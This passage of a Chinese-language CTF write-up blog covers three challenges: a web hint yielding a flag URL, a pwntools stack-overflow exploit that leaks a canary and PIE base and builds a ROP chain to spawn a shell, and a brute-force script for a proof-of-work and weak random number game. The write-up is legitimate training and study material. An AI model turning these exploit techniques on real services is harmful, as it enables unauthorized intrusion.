+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.maybe used first url get random:</span><br><span class="line">/mimic_storage</span><br><span class="line"></span><br><span class="line">2.maybe used second url get flag:</span><br><span class="line">/getflag?sec=random&amp;path=xxxx</span><br><span class="line"></span><br><span class="line">xxx is:</span><br><span class="line">bAzlsD1ChiFW5eMC5tUokHErPkdjqARE</span><br></pre></td></tr></table></figure>
+
+<p>直接根据提示访问，即可得到flag。</p>
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>典型栈溢出+ROP题，带PIE和Canary。<br>nc怼上去后，输1可以泄露函数地址。输2，可以输入内容，长度超过200时会溢出覆盖栈。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.gdb <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;172.52.x.x&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to mimic world,try something\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">func_addr = <span class="built_in">int</span>(p.recvline().decode(), <span class="number">16</span>)</span><br><span class="line">base_addr = func_addr - <span class="number">0xa94</span></span><br><span class="line">getshell_addr = base_addr + <span class="number">0xa00</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvline() <span class="comment"># hello</span></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">200</span>)</span><br><span class="line">ret = p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">200</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">popedi_addr = <span class="number">0xc73</span></span><br><span class="line">binsh_addr = <span class="number">0x202068</span></span><br><span class="line">syscall_addr = <span class="number">0x870</span></span><br><span class="line">ret_addr = <span class="number">0x821</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">200</span> + canary + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(base_addr + ret_addr) + p64(popedi_addr + base_addr)</span><br><span class="line">payload += p64(base_addr + binsh_addr) + p64(base_addr + syscall_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="weakrandom"><a href="#weakrandom" class="headerlink" title="weakrandom"></a>weakrandom</h2><p>感觉是个非预期解。没看到公告里有提供程序代码。随便输了几个整数，好像小概率随机数有重复值。<br>因此写了个代码，不断尝试输入0，直到返回固定值时，输入该值，即可得到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.52.x.x&#x27;</span>, <span class="number">9998</span>)</span><br><span class="line"></span><br><span class="line">    shastr = p.recvline(keepends = <span class="literal">False</span>).decode()</span><br><span class="line">    ends = shastr.split(<span class="string">&#x27;==&#x27;</span>)[<span class="number">0</span>].strip().split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>][:-<span class="number">1</span>]</span><br><span class="line">    shares = shastr.split(<span class="string">&#x27;==&#x27;</span>)[<span class="number">1</span>].strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getShaAns</span>(<span class="params">e: <span class="built_in">str</span>, target: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        tables = string.ascii_letters + string.digits</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> tables:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> tables:</span><br><span class="line">                    <span class="keyword">for</span> l <span class="keyword">in</span> tables:</span><br><span class="line">                        s = i + j + k + l + e</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha256(s.encode()).hexdigest() == target:</span><br><span class="line">                            <span class="keyword">return</span> s</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    ans = getShaAns(ends, shares)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Give me XXXX:\n&#x27;</span>)</span><br><span class="line">    p.sendline(ans[:<span class="number">4</span>])</span><br><span class="line">    number = <span class="string">&quot;0&quot;</span></span><br><span class="line">    last = <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            a = p.recvuntil(<span class="string">&quot;Please your guess : &quot;</span>).decode()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">                <span class="built_in">print</span>(a)</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Fail&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">                searchObj = re.search( <span class="string">r&#x27;Fail! The number is ([0-9]+)&#x27;</span>, a, re.M|re.I)</span><br><span class="line">                <span class="keyword">if</span> searchObj:</span><br><span class="line">                    now = searchObj.group(<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">if</span> now == last:</span><br><span class="line">                        number = now</span><br><span class="line">                    last = now</span><br><span class="line">            p.sendline(number)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>PwnIO</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://pwnio.com/2022/02424817df98.html">http://pwnio.com/2022/02424817df98.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Tech/"># Tech</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© PwnIO | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
